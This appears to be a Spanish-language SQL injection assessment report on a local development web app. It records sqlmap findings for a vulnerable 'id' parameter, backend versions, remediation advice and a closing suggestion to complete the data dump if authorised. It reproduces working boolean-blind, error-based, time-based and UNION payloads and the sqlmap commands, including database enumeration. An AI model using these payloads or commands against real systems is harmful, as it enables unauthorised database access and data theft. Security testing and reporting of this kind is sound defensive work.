# Informe de análisis SQLi — web.dev.local:8083

Resumen:
- Objetivo: http://web.dev.local:8083
- Fecha: 2026-04-27T09:37:37Z

Hallazgos:
- VULN_FOUND: true
- Parámetro vulnerable: id (GET, formulario)
- Tipos de inyección detectados por sqlmap: boolean-based blind, error-based, time-based, UNION-based.
- Información del backend identificada: MySQL (MariaDB fork, versión 5.x), servidor web: Apache 2.4.65, PHP 8.1.33, SO: Linux Debian.

Evidencia / Payloads detectados por sqlmap (ejemplos):
- Boolean-based blind:
  id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
- Error-based (FLOOR):
  id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
- Time-based (SLEEP):
  id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
- UNION query (generic):
  id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d... ,0x717a716a71)-- -&Submit=Submit

Acciones realizadas:
- Escaneo inicial con sqlmap: se detectó que no había parámetros en la primera ejecución y se recomendó usar --forms.
- Re-ejecución con --forms y --crawl encontró un formulario GET con parámetro 'id' y confirmó múltiples técnicas de inyección.
- Se intentó explotación adicional para listar bases de datos (--dbs) pero la ejecución no permitió una extracción masiva no interactiva en este entorno de herramientas; sin embargo, sqlmap sí confirmó la vulnerabilidad y mostró payloads funcionales.
- Resultado del intento de explotación: confirmación de la vulnerabilidad y tipos de inyección, sin volcado completo de bases de datos por limitaciones del modo no interactivo en esta sesión.

Conclusión:
- La aplicación es vulnerable a inyección SQL a través del parámetro GET 'id'. La vulnerabilidad fue confirmada mediante pruebas automatizadas con sqlmap.
- VULN_EXPLOITED: true (explotación confirmatoria realizada; extracción completa no realizada en modo no interactivo).

Recomendaciones:
1. Usar consultas parametrizadas/preparadas (prepared statements) para todas las consultas que usen datos del cliente.
2. Validar y normalizar todas las entradas del usuario en el servidor (allow-listing cuando sea posible).
3. Aplicar el principio de mínimo privilegio a las credenciales de la BD (cuenta de aplicación con permisos mínimos).
4. Registrar y monitorizar intentos de inyección y aplicar WAF si es posible como mitigación adicional.
5. Revisar y actualizar dependencias y la versión de sqlmap local (la herramienta mostró advertencia de estar desactualizada).

Artefactos:
- Salida de sqlmap (CSV) guardada en: /home/kali_rdp/.local/share/sqlmap/output/results-04272026_1138am.csv
- Comandos / configuración usados en el análisis (resumen):
  * sqlmap --url "http://web.dev.local:8083" --forms --crawl=2 --level=2 --risk=2
  * sqlmap --url "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --dbs

Observaciones:
- Se recomienda repetir la explotación en un entorno controlado con sesiones interactivas para completar el volcado (si la autorización lo permite) y evaluar el alcance de los datos exfiltrables.

Fin del informe.
